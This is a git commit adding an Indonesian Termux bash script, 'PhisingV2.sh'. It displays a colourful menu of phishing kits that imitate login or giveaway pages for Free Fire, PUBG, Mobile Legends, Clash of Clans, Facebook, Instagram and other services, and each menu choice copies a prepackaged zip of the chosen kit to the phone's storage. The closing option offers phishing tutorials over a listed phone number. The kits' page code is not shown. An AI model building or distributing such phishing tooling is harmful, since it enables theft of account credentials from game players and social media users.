6d2afbd9bf53924a9c8593e83da9e8815edd9877
InYourG00D1 <44290386+InYourG00D1@users.noreply.github.com>
2019-03-18 22:36:56 +0700

    Add files via upload

---
+++ PhisingV2.sh
@@ -0,0 +1,288 @@
+#!/system/xbin/bash
+#Jangan di recode dong ster 
+#usaha kalo gk bisa nanya 
+
+
+blue='\033[34;1m'
+green='\033[32;1m'                                        
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+
+echo $red "🐇Terkadang kita Hidup lupa akan Tanah"
+sleep 1
+clear
+echo $blue "🐆Terkadang kita Hidup lupa akan Tanah"
+sleep 1
+clear
+echo $green "🐺Terkadang kita Hidup lupa akan Tanah"
+sleep 1
+clear
+echo $red "🐇Terkadang kita Hidup lupa akan Tanah"
+sleep 
+clear
+echo $blue "🐆Terkadang kita Hidup lupa akan Tanah"
+sleep 1
+clear
+echo $green "🐺Terkadang kita Hidup lupa akan Tanah"
+sleep 1
+clear
+echo $red "🐇Terkadang kita Hidup lupa akan Tanah"
+sleep 1
+clear
+echo $blue "🐆Terkadang kita Hidup lupa akan Tanah"
+sleep 1
+clear
+echo $green "🐺Terkadang kita Hidup lupa akan Tanah"
+sleep 1
+clear
+echo ""
+
+echo "\033[1;31m]
+                /^...^
+               /<_* *_>   
+              /\/ \_/ 
+      ___.-._/\/
+     /=*_*-*-*/!
+    |-{-_-_-} ! 
+    (-{-_-_-} ! 
+     \{_-_-_} ! 
+      }-_-_-} 
+      {-_|-_} 
+      {-_|_-} 
+      {_-|-_} 
+      {_-|-_} 
++=====%%@ @%%=============================+
++ coded by : InYourG00D                   +
++ Team : LNX#CREW S.T.C BUFT              +
++ kontak me : 62895805133060               +
++ GitHub : https://github.com/InYourG00D1 +
++=========================================+
+  ^...^                      ^...^
+ <_* *_>Script Phising Game <_* *_> 
+   \_/                        \_/   ";
+echo $blue "-=[Menu]=-"
+echo $green "[================================[>"
+echo "-=:FreeFire:=-"|lolcat
+echo $red "[================================[>"
+echo "1.bundel gg"|lolcat
+echo $yellow "[================================[>"
+echo "2.Viral"|lolcat
+echo $green "[================================[>"
+echo "3.DiamondGratis"|lolcat
+echo $red "[================================[>"
+echo "-=:MobileLegends:=-"|lolcat
+echo $yellow "[================================[>"
+echo "4.Viral"|lolcat
+echo $green "[================================[>"
+echo "-=:CoC:=-"|lolcat
+echo $cyan "[================================[>"
+echo "5.Versi Turnament"|lolcat
+echo $yellow "[================================[>"
+echo "6.Viral"|lolcat
+echo $purple "[================================[>"
+echo "-=:Pubg:=-"|lolcat
+echo $red "[================================[>"
+echo "7.TrueLogin"|lolcat
+echo $yellow "[================================[>"
+echo "8.UC"|lolcat
+echo $green "[================================[>"
+echo "9.Viral"|lolcat
+echo $blue "[================================[>"
+echo "10.TrueLogin"|lolcat
+echo $red "[================================[>"
+echo "11.Viral(2)"|lolcat
+echo $cyan "[================================[>"
+echo "-=:PB Evolved:=-"|lolcat
+echo $green "[================================[>"
+echo "12.TrueLogin"|lolcat
+echo $yellow "[================================[>"
+echo "-=:FaceBook:=-"|lolcat
+echo $green "[================================[>"
+echo "13.WarnaWarni"|lolcat
+echo $blue "[================================[>"
+echo "-=:AoV:=-"|lolcat
+echo $purple "[================================[>"
+echo "14.Viral"|lolcat
+echo $red "[================================[>"
+echo "-=:Instagram:=-"|lolcat
+echo $green "[================================[>"
+echo "15.Generator Liker"|lolcat
+echo $yellow "[================================[>"
+echo "16.Auto Like"|lolcat
+echo $green "[================================[>"
+echo "00.Ini Out"|lolcat
+echo $red
+read -p "[>>" gmt
+
+if [ $gmt = 1 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f Bundle.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 2 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f ff.viral.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 3 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f DG.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 4 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f Mz.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+echo $blue "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 5 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f Tour.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 6 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f coc.viral.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 7 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f truelogin.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 8 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f UC.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 9 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f viral2.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 10 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f viral3.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 11 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f viral4.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 12 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f evolved.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+echo $blue "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 13 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f pelangi.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 14 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f aov.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 15 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f gl.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 16 ]
+then 
+clear
+echo "Wait Bro"
+cd menu
+mv -f Autolike.zip /sdcard
+echo $red "DoneBosQ"
+echo $green "Silahkan Cek Di Folder/file"
+fi
+
+if [ $gmt = 00 ]
+then 
+clear
+echo "Untuk Totur Bikin phising Chat Me Free Ko"|lolcat
+echo "62895805133060 tuh no wa gw"|lolcat
+echo "Bye"|lolcat
+fi
